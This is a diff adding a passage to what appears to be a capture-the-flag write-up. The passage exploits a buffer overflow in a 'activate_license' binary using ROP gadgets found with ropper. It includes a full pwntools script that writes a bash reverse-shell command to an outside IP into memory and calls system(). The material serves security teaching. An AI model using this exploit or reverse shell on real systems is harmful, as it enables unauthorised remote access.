@@ -378,3 +378,84 @@ libc_system = 0x48e50
 binary_base = 0x55fc9a3b1000
 ```
 {: .nolineno }
+
+Okay, before we start, let's define the attack strategy, which will be as follows:
+
+1. fill stack with junk to gain control of the `rip` (instruction pointer)
+2. find a section in memory where we can write
+3. write our payload in to the writable memory
+4. call the function system indicating as parameter a pointer to the memory section in which we have written our payload
+
+Step 1 is already complete, we know that we need `520 bytes` of junk and the next `8 bytes` are the ones that will overwrite `rip`.
+
+To find a section that we can write to, let's look for the `.data` part inside the binary.
+
+```bash
+$ readelf -S activate_license | grep ".data"
+  [16] .rodata           PROGBITS         0000000000002000  00002000
+  [23] .data             PROGBITS         0000000000004000  00003000
+```
+{: .nolineno }
+
+Great, now we know that the address we have to write to is `binary_base + 0x4000`.
+
+To copy our payload to the memory section where we can write and then execute the system call, we are going to make use of some [ROP Gadgets](https://en.wikipedia.org/wiki/Return-oriented_programming) that will help us in this task.
+
+```bash
+$ ropper -f libc-2.31.so --search "pop rdi; ret"
+0x0000000000026796: pop rdi; ret;
+0x0000000000084bfd: pop rdi; retf; adc eax, dword ptr [rax]; ror rax, 0x11; xor rax, qword ptr fs:[0x30]; jmp rax;
+
+$ ropper -f libc-2.31.so --search "pop rdx; ret"
+0x00000000000cb1cd: pop rdx; ret;
+
+$ ropper -f libc-2.31.so --search "mov [rdi], rdx; ret"
+0x000000000003ace5: mov qword ptr [rdi], rdx; ret;
+```
+{: .nolineno }
+
+Now that we have everything we need we are going to generate the final exploit with all of the above.
+
+```bash
+from pwn import *
+
+offset = 520
+
+# libc
+libc_base = 0x7f32527fd000
+libc_system = p64(libc_base + 0x48e50)
+
+# binary
+binary_base = 0x55fc9a3b1000
+writable = binary_base + 0x4000
+
+# gadgets
+POP_RDI = p64(libc_base + 0x26796)
+POP_RDX = p64(libc_base + 0xcb1cd)
+MOV_RDI_RDX = p64(libc_base + 0x3ace5)
+
+sh = b"bash -c 'bash -i >& /dev/tcp/10.10.14.42/4242 0>&1'"
+
+rop = b"A" * offset
+for i in range(0, len(sh), 8):
+  rop += POP_RDI
+  rop += p64(writable + i)
+  rop += POP_RDX
+  rop += sh[i:i+8].ljust(8, b"\x00")
+  rop += MOV_RDI_RDX
+
+rop += POP_RDI
+rop += p64(writable)
+rop += libc_system
+
+with open('license.payload', 'wb') as f:
+  f.write(rop)
+```
+
+It sounds complicated, but really what you are doing is very simple. We adjust all the gadgets that we have found taking into account what is the base of libc, as well as the section in memory in which we are going to write with respect to the base of the binary.
+
+We create our payload (`line 18`), we start the rop introducing the junk (`520 bytes`) and we make a loop over our payload in fragments of `8 bytes`, for each iteration an address in memory is established in which it will be written, starting from the initial base (`line 23`), this address is stored in `rdi`, the following is to take the 8 bytes corresponding to the payload (and in case of needing it because it does not have 8 bytes long, add nullbytes to fill it), store these bytes in `rdx` (`line 25`). Subsequently, the content of `rdx` is moved to the memory address indicated by `rdi`. At the end of the for loop, what we have achieved is to write the whole string of our payload in memory.
+
+For the final phase, all we do is push the address with the start of our payload into `rdi` and call system, which uses `rdi` as the first function parameter.
+
+We save the final result in a file, and use the functionality of the application that we had seen before to upload our file.
